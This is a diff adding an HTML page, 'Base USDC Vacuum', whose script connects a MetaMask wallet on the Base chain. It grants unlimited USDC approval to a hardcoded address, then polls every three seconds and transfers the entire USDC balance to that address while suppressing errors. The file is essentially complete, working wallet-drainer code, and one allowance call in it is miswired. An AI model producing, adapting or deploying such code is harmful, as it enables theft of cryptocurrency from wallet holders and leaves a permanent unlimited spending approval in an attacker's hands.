@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Base USDC Vacuum</title>
+  <style>
+    body { font-family: system-ui; background: #000; color: #0f0; text-align: center; padding: 2rem; line-height: 1.6; }
+    .card { background: #111; border: 1px solid #0f0; border-radius: 16px; padding: 2rem; max-width: 440px; margin: 0 auto; }
+    h1 { font-size: 2.5rem; margin: 0; }
+    .status { margin: 1.5rem 0; padding: 1rem; background: #001a00; border-radius: 8px; min-height: 50px; }
+    button { background: #0f0; color: #000; border: none; padding: 1rem 2rem; font-size: 1.2rem; border-radius: 50px; cursor: pointer; font-weight: bold; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .log { font-family: monospace; font-size: 0.9rem; text-align: left; background: #000; padding: 1rem; border-radius: 8px; margin-top: 1rem; max-height: 300px; overflow-y: auto; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Base USDC Vacuum</h1>
+    <p>Unlimited approval + instant auto-drain to<br><strong>0xf53a...b62f1</strong></p>
+    
+    <div class="status" id="status">Click to activate vacuum...</div>
+    
+    <button id="startBtn">START VACUUM</button>
+    
+    <div class="log" id="log"></div>
+  </div>
+
+  <script type="module">
+    import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js";
+
+    const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+    const SPENDER = "0xf53a15155a2a1bc0f342b46fb5540949605b62f1"; // ← YOUR FINAL DESTINATION
+
+    const status = document.getElementById("status");
+    const log = document.getElementById("log");
+    const btn = document.getElementById("startBtn");
+
+    let provider, signer, user;
+
+    function addLog(msg) {
+      log.innerHTML += `${new Date().toLocaleTimeString()} → ${msg}<br>`;
+      log.scrollTop = log.scrollHeight;
+    }
+
+    async function startVacuum() {
+      if (!window.ethereum) return alert("MetaMask required");
+
+      btn.disabled = true;
+      status.textContent = "Connecting...";
+
+      provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = await provider.getSigner();
+      user = await signer.getAddress();
+
+      const { chainId } = await provider.getNetwork();
+      if (chainId !== 8453n) {
+        status.textContent = "Switch to Base chain first!";
+        btn.disabled = false;
+        return;
+      }
+
+      status.textContent = `Vacuum armed: ${user.slice(0,8)}...`;
+      addLog(`Vacuum activated for ${user}`);
+
+      // Unlimited approval
+      const usdc = new ethers.Contract(USDC, ["function approve(address,uint256) returns(bool)"], signer);
+      const max = ethers.MaxUint256;
+
+      try {
+        const allowance = await usdc.allowance(user, SPENDER);
+        if (allowance < max / 2n) {
+          addLog("Sending unlimited approval...");
+          const tx = await usdc.approve(SPENDER, max);
+          addLog(`Approval tx: ${tx.hash}`);
+          await tx.wait();
+          addLog("Unlimited approval granted forever");
+        } else {
+          addLog("Approval already unlimited");
+        }
+      } catch (e) {
+        addLog("Approval error: " + e.message);
+      }
+
+      // Instant drain loop
+      let lastBalance = 0n;
+      setInterval(async () => {
+        try {
+          const balance = await new ethers.Contract(USDC, ["function balanceOf(address) view returns(uint256)"], provider).balanceOf(user);
+          
+          if (balance > lastBalance) {
+            const incoming = balance - lastBalance;
+            addLog(`+${ethers.formatUnits(incoming, 6)} USDC → Draining now!`);
+
+            const tx = await new ethers.Contract(USDC, ["function transfer(address,uint256)"], signer)
+              .transfer(SPENDER, balance);
+            addLog(`Drained! Tx: ${tx.hash}`);
+            lastBalance = 0n;
+          } else {
+            lastBalance = balance;
+          }
+        } catch (e) {
+          // Keep running silently
+        }
+      }, 3000);
+
+      addLog("Auto-drain loop running 24/7");
+      status.textContent = "VACUUM ACTIVE → All Base USDC goes to 0xf53a...b62f1 instantly";
+    }
+
+    btn.onclick = startVacuum;
+  </script>
+</body>
+</html>
